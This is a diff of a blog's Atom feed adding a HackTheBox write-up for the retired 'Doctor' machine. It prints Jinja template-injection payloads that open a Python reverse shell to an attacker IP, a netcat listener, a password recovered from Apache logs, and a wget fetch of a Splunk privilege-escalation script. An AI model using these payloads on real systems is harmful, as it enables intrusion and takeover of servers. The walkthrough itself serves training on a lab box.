@@ -1,5 +1,651 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-12-14T09:50:00+01:00</updated><entry><title>HTB: OpenKeyS</title><link href="https://maggick.fr/2020/12/htb-openkeys.html" rel="alternate"></link><published>2020-12-14T09:50:00+01:00</published><updated>2020-12-14T09:50:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-14:/2020/12/htb-openkeys.html</id><summary type="html">&lt;p&gt;&lt;img alt="openkeys card" class="align-left" src="/media/2020.12/openkeys_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-02-07T18:15:00+01:00</updated><entry><title>HTB: Admirer</title><link href="https://maggick.fr/2021/02/htb-admirer.html" rel="alternate"></link><published>2021-02-07T18:15:00+01:00</published><updated>2021-02-07T18:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-07:/2021/02/htb-admirer.html</id><summary type="html">&lt;p&gt;&lt;img alt="Doctor card" class="align-left" src="/media/2021.02/doctor_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/278"&gt;Doctor&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
+and publish on September 26, 2020.
+This box is classified as an easy machine. The user part implied a server side
+template injection and finding a needle in a haystack. The root part required to
+use a Splunk exploit to elevate our privileges.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.02/doctor_card.png" alt="Doctor card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/278"&gt;Doctor&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
+and publish on September 26, 2020.
+This box is classified as an easy machine. The user part implied a server side
+template injection and finding a needle in a haystack. The root part required to
+use a Splunk exploit to elevate our privileges.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH), 80 (HTTP) and 8080 (splunk web interface) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Sep 28 06:35:31 2020 as: nmap -p- -oN nmap -sSV 10.10.10.209&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.209&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.077s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65532 filtered ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE  VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
+&lt;span class="code-line"&gt;8089/tcp open  ssl/http Splunkd httpd&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Mon Sep 28 06:37:56 2020 -- 1 IP address (1 host up) scanned in 145.15 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web-port-8089"&gt;Web - port 8089&lt;/h2&gt;
+&lt;p&gt;On the port 8089 we have a splunk running (as found by nmap) but we don't have
+access to the different function as we don't know any credentials.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Front page and contact email" src="/media/2021.02/doctor_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;An access to this function will have allowed us to
+&lt;a href="https://github.com/cnotin/SplunkWhisperer2"&gt;have a remote code execution on the server&lt;/a&gt;
+or &lt;a href="https://github.com/tevora-threat/splunk_local_privesc"&gt;allowed us to elevate our privileges on the box&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="web-port-80"&gt;Web - port 80&lt;/h2&gt;
+&lt;p&gt;The website is about healthcare and doctors. We also see an email contact address
+on the front page with the domain &lt;em&gt;doctors.htb&lt;/em&gt; (note the &lt;em&gt;s&lt;/em&gt; at the end).&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Front page and contact email" src="/media/2021.02/doctor_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We had the domain to &lt;code&gt;/etc/hosts&lt;/code&gt; and browse to it. The website is a "secure"
+messaging application with a self sign-in function.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Doctor Secure Messaging" src="/media/2021.02/doctor_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We create an account and post a message.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Doctor Secure Messaging" src="/media/2021.02/doctor_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;When looking at the page source code we found a comment about the archive
+function:
+&lt;code&gt;&amp;lt;!--archive still under beta testing&amp;lt;a class="nav-item nav-link" href="/archive"&amp;gt;Archive&amp;lt;/a&amp;gt;--&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id="ssti"&gt;SSTI&lt;/h3&gt;
+&lt;p&gt;We check for common vulnerabilities and found out that the application is
+vulnerable to &lt;a href="https://portswigger.net/web-security/server-side-template-injection"&gt;server side template injection&lt;/a&gt;
+in the title as when our title is &lt;code&gt;{{7*7}}&lt;/code&gt; when can see the operation result
+(49) in the archive.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Message with SSTI test payload" src="/media/2021.02/doctor_04.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Payload executed in the archive section" src="/media/2021.02/doctor_05.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can use this injection to &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"&gt;execute command on the system&lt;/a&gt;.
+After a few test we know that python is on the box and can run a few commands.
+The payload below runs &lt;code&gt;id&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.121\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/id\"]);'").read().zfill(417)}}{%endif%}{% endfor %}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We (obviously) run a netcat listener to catch the command's output.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_doctor$ nc -l -p 4444&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1001(web) gid=1001(web) groups=1001(web),4(adm)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We then go for a reverse shell with the following payload be careful with the
+quotes and escaped quotes).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.121\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/bash\");'").read().zfill(417)}}{%endif%}{% endfor %}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;That allow us to get a reverse shell on the box.&lt;/p&gt;
+&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;After &lt;em&gt;a lot&lt;/em&gt; of enumeration both
+&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"&gt;manually&lt;/a&gt;
+and using tools as
+&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"&gt;linPEAS&lt;/a&gt;
+we found out that there is &lt;code&gt;backup&lt;/code&gt; file in &lt;code&gt;/var/log/apache2&lt;/code&gt; containing a call
+to the password reset function but the user put its password instead of its
+email.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;web@doctor:/var/log/apache2$ grep password backup&lt;/span&gt;
+&lt;span class="code-line"&gt;grep password backup&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &amp;quot;POST /reset_password?email=Guitar123&amp;quot; 500 453 &amp;quot;http://doctor.htb/reset_password&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;That password allow us to connect as &lt;code&gt;shaun&lt;/code&gt; using the switch user &lt;code&gt;su&lt;/code&gt; command
+and get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;web@doctor:/var/log/apache2$ su shaun&lt;/span&gt;
+&lt;span class="code-line"&gt;su shaun&lt;/span&gt;
+&lt;span class="code-line"&gt;Password: Guitar123&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;shaun@doctor:/var/log/apache2$ cat /home/shaun/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /home/shaun/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;2b14d9d9ff996cfb2e4fb96e6db82631&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;Now that we have a username and a password we can try them against the Splunk
+service. And they are working!&lt;/p&gt;
+&lt;p&gt;We transfer the &lt;a href="https://github.com/tevora-threat/splunk_local_privesc"&gt;script mentioned above&lt;/a&gt;
+to the box using &lt;code&gt;python -m http.server&lt;/code&gt; on our kali box.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;shaun@doctor:/tmp$ wget 10.10.14.121:8000/spelunker.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;wget 10.10.14.121:8000/spelunker.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;--2020-09-29 11:22:03--  http://10.10.14.121:8000/spelunker.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;Connecting to 10.10.14.121:8000... connected.&lt;/span&gt;
+&lt;span class="code-line"&gt;HTTP request sent, awaiting response... 200 OK&lt;/span&gt;
+&lt;span class="code-line"&gt;Length: 2503 (2,4K) [text/x-sh]&lt;/span&gt;
+&lt;span class="code-line"&gt;Saving to: ‘spelunker.sh.1’&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;spelunker.sh.1      100%[===================&amp;gt;]   2,44K  --.-KB/s    in 0s&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;2020-09-29 11:22:03 (254 MB/s) - ‘spelunker.sh.1’ saved [2503/2503]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we give the execution permission to the script and run it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;shaun@doctor:/tmp$ chmod +x spelunker.sh.1&lt;/span&gt;
+&lt;span class="code-line"&gt;chmod +x spelunker.sh.1&lt;/span&gt;
+&lt;span class="code-line"&gt;shaun@doctor:/tmp$ ./spelunker.sh.1&lt;/span&gt;
+&lt;span class="code-line"&gt;./spelunker.sh.1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] SPLUNK LOCAL PRIVESC [!]&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] This tool assumes the creds are admin:changeme&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] and the port is 8089&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Creating a tmp workspace and moving there...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Creating the splunk app...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Creating the payload...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Tarballing the App and removing temp files...&lt;/span&gt;
+&lt;span class="code-line"&gt;./APPY/&lt;/span&gt;
+&lt;span class="code-line"&gt;./APPY/bin/&lt;/span&gt;
+&lt;span class="code-line"&gt;./APPY/bin/pay.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;./APPY/local/&lt;/span&gt;
+&lt;span class="code-line"&gt;./APPY/local/inputs.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] App should be created...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Installing the malicious splunk app....&lt;/span&gt;
+&lt;span class="code-line"&gt;HTTP/1.1 201 Created&lt;/span&gt;
+&lt;span class="code-line"&gt;Date: Tue, 29 Sep 2020 09:22:31 GMT&lt;/span&gt;
+&lt;span class="code-line"&gt;Expires: Thu, 26 Oct 1978 00:00:00 GMT&lt;/span&gt;
+&lt;span class="code-line"&gt;Cache-Control: no-store, no-cache, must-revalidate, max-age=0&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: text/xml; charset=UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;X-Content-Type-Options: nosniff&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 4342&lt;/span&gt;
+&lt;span class="code-line"&gt;Vary: Cookie, Authorization&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: Close&lt;/span&gt;
+&lt;span class="code-line"&gt;X-Frame-Options: SAMEORIGIN&lt;/span&gt;
+&lt;span class="code-line"&gt;Server: Splunkd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?xml-stylesheet type=&amp;quot;text/xml&amp;quot; href=&amp;quot;/static/atom.xsl&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;feed xmlns=&amp;quot;http://www.w3.org/2005/Atom&amp;quot; xmlns:s=&amp;quot;http://dev.splunk.com/ns/rest&amp;quot; xmlns:opensearch=&amp;quot;http://a9.com/-/spec/opensearch/1.1/&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;title&amp;gt;localapps&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;id&amp;gt;https://127.0.0.1:8089/services/apps/local&amp;lt;/id&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;updated&amp;gt;2020-09-29T11:22:31+02:00&amp;lt;/updated&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;generator build=&amp;quot;a1a6394cc5ae&amp;quot; version=&amp;quot;8.0.5&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;author&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;name&amp;gt;Splunk&amp;lt;/name&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;/author&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_new&amp;quot; rel=&amp;quot;create&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_reload&amp;quot; rel=&amp;quot;_reload&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;opensearch:totalResults&amp;gt;1&amp;lt;/opensearch:totalResults&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;opensearch:itemsPerPage&amp;gt;30&amp;lt;/opensearch:itemsPerPage&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;opensearch:startIndex&amp;gt;0&amp;lt;/opensearch:startIndex&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;s:messages/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;title&amp;gt;APPY&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;id&amp;gt;https://127.0.0.1:8089/servicesNS/nobody/system/apps/local/APPY&amp;lt;/id&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;updated&amp;gt;1970-01-01T01:00:00+01:00&amp;lt;/updated&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;alternate&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;author&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;name&amp;gt;nobody&amp;lt;/name&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/author&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;list&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY/_reload&amp;quot; rel=&amp;quot;_reload&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;edit&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;remove&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY/package&amp;quot; rel=&amp;quot;package&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;content type=&amp;quot;text/xml&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;s:dict&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;check_for_updates&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;configured&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;core&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;disabled&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;eai:acl&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;          &amp;lt;s:dict&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;app&amp;quot;&amp;gt;system&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_change_perms&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_list&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_share_app&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_share_global&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_share_user&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_write&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;modifiable&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;owner&amp;quot;&amp;gt;nobody&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;perms&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;              &amp;lt;s:dict&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;s:key name=&amp;quot;read&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                  &amp;lt;s:list&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                    &amp;lt;s:item&amp;gt;*&amp;lt;/s:item&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                  &amp;lt;/s:list&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;s:key name=&amp;quot;write&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                  &amp;lt;s:list&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                    &amp;lt;s:item&amp;gt;*&amp;lt;/s:item&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                  &amp;lt;/s:list&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;              &amp;lt;/s:dict&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;removable&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;sharing&amp;quot;&amp;gt;app&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;          &amp;lt;/s:dict&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;install_source_checksum&amp;quot;&amp;gt;3d642ab909020d9844b47dbf1a38c77cf7b9e0a0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;label&amp;quot;&amp;gt;APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;location&amp;quot;&amp;gt;/opt/splunkforwarder/etc/apps/APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;managed_by_deployment_client&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;name&amp;quot;&amp;gt;APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;show_in_nav&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;source_location&amp;quot;&amp;gt;/opt/splunkforwarder/etc/apps/APPY&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;state_change_requires_restart&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;status&amp;quot;&amp;gt;installed&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;visible&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;/s:dict&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/content&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;/entry&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/feed&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Removing the malicious splunk app...&lt;/span&gt;
+&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="code-line"&gt;Date: Tue, 29 Sep 2020 09:22:44 GMT&lt;/span&gt;
+&lt;span class="code-line"&gt;Expires: Thu, 26 Oct 1978 00:00:00 GMT&lt;/span&gt;
+&lt;span class="code-line"&gt;Cache-Control: no-store, no-cache, must-revalidate, max-age=0&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: text/xml; charset=UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;X-Content-Type-Options: nosniff&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 1797&lt;/span&gt;
+&lt;span class="code-line"&gt;Vary: Cookie, Authorization&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: Close&lt;/span&gt;
+&lt;span class="code-line"&gt;X-Frame-Options: SAMEORIGIN&lt;/span&gt;
+&lt;span class="code-line"&gt;Server: Splunkd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;!--This is to override browser formatting; see server.conf[httpServer] to disable. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .--&amp;gt;&lt;/span&gt;
